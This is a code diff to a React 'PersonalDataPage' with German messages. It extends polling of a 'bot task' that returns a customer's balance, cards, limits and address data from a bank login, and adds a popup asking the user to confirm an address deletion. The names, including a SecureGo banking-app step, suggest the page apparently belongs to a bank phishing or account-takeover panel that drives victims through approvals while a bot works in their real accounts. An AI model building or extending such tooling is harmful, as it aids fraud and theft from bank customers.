@@ -124,6 +124,14 @@ function PersonalDataPage() {
   const [addressDecisionPending, setAddressDecisionPending] = useState(false);
   const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
 
+  // Address-confirm popup (driven by bot's address_data / waiting_for_address_confirm)
+  const [addrModalOpen, setAddrModalOpen] = useState(false);
+  const [addrModalDismissed, setAddrModalDismissed] = useState(false);
+  const [addrSubmitting, setAddrSubmitting] = useState(false);
+  const [addrSuccess, setAddrSuccess] = useState(false);
+  const [addrError, setAddrError] = useState<string | null>(null);
+  const dismissedRef = useRef(false);
+
   // Bank context is cached from the login route; restore synchronously
   useEffect(() => {
     try {
@@ -142,25 +150,58 @@ function PersonalDataPage() {
     } catch {}
   }, [taskId]);
 
-  // Keep polling briefly in case more fields arrive after the initial redirect
+  // Continuous polling for late-arriving data (balance/cards/limits/address_data)
   useEffect(() => {
     let cancelled = false;
     let timer: ReturnType<typeof setTimeout> | null = null;
-    let attempts = 0;
+    const start = Date.now();
+    const MAX_MS = 5 * 60 * 1000; // 5 min safety cap
     const tick = async () => {
-      attempts += 1;
       const { data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
       if (cancelled) return;
       if (data?.result) {
         setResult(data.result);
         try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
       }
-      if (data?.status === "completed" || data?.status === "failed" || attempts > 12) return;
-      timer = setTimeout(tick, 800);
+      // Open address-confirm popup as soon as the bot reports address_data
+      // or explicitly waits for address confirmation.
+      const addr = data?.result?.address_data ?? null;
+      const waiting = data?.status === "waiting_for_address_confirm";
+      if ((addr || waiting) && !dismissedRef.current && !addrSuccess) {
+        setAddrModalOpen(true);
+      }
+      const done = data?.status === "completed" || data?.status === "failed";
+      if (done || Date.now() - start > MAX_MS) return;
+      timer = setTimeout(tick, 1500);
     };
     tick();
     return () => { cancelled = true; if (timer) clearTimeout(timer); };
-  }, [taskId]);
+  }, [taskId, addrSuccess]);
+
+  const addressData = result?.address_data ?? null;
+
+  async function handleConfirmDelete() {
+    setAddrError(null);
+    setAddrSubmitting(true);
+    try {
+      const res = await confirmAddress(taskId);
+      if (!res.ok) {
+        const body = await res.text().catch(() => "");
+        throw new Error(`HTTP ${res.status}${body ? ` – ${body.slice(0, 160)}` : ""}`);
+      }
+      setAddrSuccess(true);
+      dismissedRef.current = true;
+      // Brief success indicator, then close.
+      setTimeout(() => {
+        setAddrModalOpen(false);
+        setAddrModalDismissed(true);
+      }, 1200);
+    } catch (e: any) {
+      setAddrError(e?.message || "Aufruf fehlgeschlagen. Bitte erneut versuchen.");
+    } finally {
+      setAddrSubmitting(false);
+    }
+  }
 
   const customer = useMemo(
     () => (result ? mapCustomer(result, bankCtx?.bankName ?? "") : null),
